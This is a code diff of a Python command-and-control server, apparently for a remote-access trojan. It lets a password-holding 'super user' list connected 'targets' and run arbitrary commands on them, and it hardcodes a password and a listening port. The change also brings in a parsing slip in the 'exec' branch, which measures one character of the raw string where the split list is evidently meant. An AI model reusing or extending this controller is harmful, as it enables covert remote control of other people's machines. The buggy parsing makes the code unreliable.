@@ -39,26 +39,23 @@ class Server:
 		while True:		
 			try:
 				command = conn.recv(1024)
-				content = command.decode().split(" ")
+				content = command.decode()
+				content_splited = content.split(" ")
 
-				if content[0] == "all_clients":
-					conn.send(bytes(f"{self.targets_list}", "utf-8"))
-				
-				if len(content) < 3:
-					conn.send(bytes(f"unknow command: {command.decode()}", "utf-8"))
-					continue
 			except:
 				print(f"{addr[0]}:{addr[1]}", "super user was disconnected")
 				break
 			
+			if content_splited[0] == "all_clients":
+				conn.send(bytes(f"{self.targets_list}", "utf-8"))
 
-			if content[0] == "exec":
-				cut = len(content[0])+len(content[1])+2
-				self.exec_on_client(content[1], command.decode()[cut:])
+			elif content_splited[0] == "exec" and len(content_splited) > 2:
+				cut = len(content_splited[0])+len(content[1])+2
+				self.exec_on_client(content_splited[1], content[cut:])
 			
-			elif content[0] == "cmd":
-				cut = len(content[0])+len(content[1])+2
-				self.cmd_on_client(conn, content[1], command.decode()[cut:])
+			elif content_splited[0] == "cmd" and len(content_splited) > 2:
+				cut = len(content_splited[0])+len(content_splited[1])+2
+				self.cmd_on_client(conn, content_splited[1], content[cut:])
 
 			else:
 				conn.send(bytes(f"unknow command: {command.decode()}", "utf-8"))
@@ -108,6 +105,5 @@ if __name__ == "__main__":
 	SERVER_HOST = "0.0.0.0"
 	SERVER_PORT = 7546
 	SUPER_PASSWORD = "jesus_134"
-
 	server = Server(SERVER_HOST, SERVER_PORT, SUPER_PASSWORD)	
 	server.start()
